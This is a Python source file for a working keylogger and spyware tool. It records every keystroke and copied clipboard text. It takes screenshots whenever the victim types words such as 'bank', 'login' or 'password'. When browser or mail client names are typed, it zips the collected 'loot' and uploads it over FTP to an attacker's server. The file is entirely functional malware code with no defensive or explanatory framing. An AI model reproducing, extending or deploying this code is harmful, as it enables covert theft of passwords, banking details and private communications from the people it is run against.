import keyboard
import pyperclip
import mss
import datetime
from zipfile import ZipFile
import os
import ftplib

keyboard_log = "<path_to_store_keystroke_log>"
clipboard_log = "<path_to_store_clipboard_log>"
screen_log = "<path_to_store_screenshot_log>"
loot_location = "<path_to_parent_folder>"
loot_server = "<ftp_server>"
ftp_user = "<ftp_username>"
ftp_password = "<ftp_password>"


def event_handler(event):
    # Could expand this function with more features
    if event.event_type != keyboard.KEY_DOWN:
        return

    else:
        log_keyboard_event(event.name)


def log_keyboard_event(key):
    with open(keyboard_log, "a") as log_stream:
        if key == "space":
            log_stream.write(" ")
        else:
            log_stream.write(key)
def clipboard_event():
    print("[*] Clipboard copied: ")
    with open(clipboard_log, "a") as clipboard_stream:
        clipboard_stream.writelines(pyperclip.paste())
def take_screenshot():
    file_name = screen_log + str(datetime.datetime.now()).replace(" ", "").replace(":", "") + ".png"
    with mss.mss() as sct:
        for file in sct.save(mon=-1, output=file_name):
            print("[*]File saved to: " +file)

def transfer_loot():
    print("[*] Transfering loot: ")
    zip_name = loot_location + "zipped_loot" +  str(datetime.datetime.now()).replace(" ", "").replace(":", "") + ".zip"
    loot_files = gather_file_paths()
    with ZipFile(zip_name, "w") as zip_stream:
        for file in loot_files:
            zip_stream.write(file)
    ftp_session = ftplib.FTP(loot_server, ftp_user,ftp_password)
    
    ftp_session.cwd("/tmp")
    file = open(zip_name, "rb")
    ftp_session.storbinary('STOR {0}'.format(zip_name), file)
    ftp_session.sendcmd('SITE CHMOD 777 ' + zip_name)

def gather_file_paths():
    paths = []
    for root, directories, files in os.walk(loot_location):
        for filename in files:
            path = os.path.join(root, filename)
            if path.__contains__("zipped") or path.__contains__(".py"):
                continue
            else:
                paths.append(path)
    return paths


def place_hooks():
    print("[*] Placing hooks and word listener")
    keyboard.hook(event_handler)
    keyboard.add_hotkey("ctrl+c", lambda: clipboard_event()) 
    keyboard.add_hotkey("ctrl+r", lambda: take_screenshot())

    keyboard.add_word_listener("bank", lambda: take_screenshot(), triggers=['space', "enter", "esc"])
    keyboard.add_word_listener("login", lambda: take_screenshot(), triggers=['space', "enter", "esc"])
    keyboard.add_word_listener("password", lambda: take_screenshot(), triggers=['space', "enter", "esc"])
    keyboard.add_word_listener("email", lambda: take_screenshot(), triggers=['space', "enter", "esc"])


    keyboard.add_word_listener("chrome", lambda: transfer_loot(), triggers=['space', "enter"])
    keyboard.add_word_listener("firefox", lambda: transfer_loot(), triggers=['space', "enter"])
    keyboard.add_word_listener("edge", lambda: transfer_loot(), triggers=['space', "enter"])
    keyboard.add_word_listener("outlook", lambda: transfer_loot(), triggers=['space', "enter"])
    keyboard.wait()

    




if __name__ == "__main__":
    place_hooks()
